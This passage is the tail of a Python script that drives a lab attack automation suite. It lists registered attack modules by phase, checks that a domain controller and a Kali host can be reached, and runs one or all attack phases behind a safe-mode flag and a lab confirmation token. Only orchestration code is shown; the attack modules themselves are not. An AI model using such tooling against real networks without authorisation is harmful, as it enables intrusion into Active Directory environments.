        logging.getLogger().setLevel(logging.DEBUG)

    if args.list_attacks:
        print(f"Registered attack modules (v{__version__}):\n")
        for phase in PHASE_ORDER:
            descriptors = sorted(
                _ATTACK_REGISTRY.get(phase, []),
                key=lambda d: d.name,
            )
            if not descriptors:
                continue
            print(f"  [{phase}]")
            for desc in descriptors:
                flag = " ⚠ dangerous" if desc.dangerous else ""
                print(f"    - {desc.name}{flag}")
                if desc.description:
                    print(f"        {desc.description}")
                if desc.dependencies:
                    print(f"        Depends on: {', '.join(desc.dependencies)}")
            print()
        return 0

    suite = LabAttackAutomation(
        config_path=args.config,
        safe_mode=not args.no_safe_mode,
        lab_confirm_token=args.lab_confirm,
    )

    try:
        # Quick connectivity check
        tcp_checks = [
            (suite.config.dc_ip, 389),
            (suite.config.kali_ip, 22),
        ]

        async def _quick_check(ip: str, port: int) -> bool:
            try:
                _, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=5)
                writer.close()
                await writer.wait_closed()
                return True
            except Exception:
                return False

        results = await asyncio.gather(*[_quick_check(ip, p) for ip, p in tcp_checks])
        if not all(results):
            print(f"{Fore.RED}Critical systems unreachable — aborting{Style.RESET_ALL}")
            return 1

        print(f"{Fore.GREEN}Lab connectivity confirmed{Style.RESET_ALL}\n")

        if args.target:
            result = await suite.execute_single(args.target)
            if result is None:
                print(f"{Fore.RED}Unknown attack: {args.target}{Style.RESET_ALL}")
                return 1
            suite.print_report()
        else:
            await suite.execute_all(phases=args.phases)
            suite.print_report()

        if args.report:
            suite.save_report()

        if not suite.results:
            return 0
        return 0 if all(r.success for r in suite.results) else 2

    finally:
        await suite.close()


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
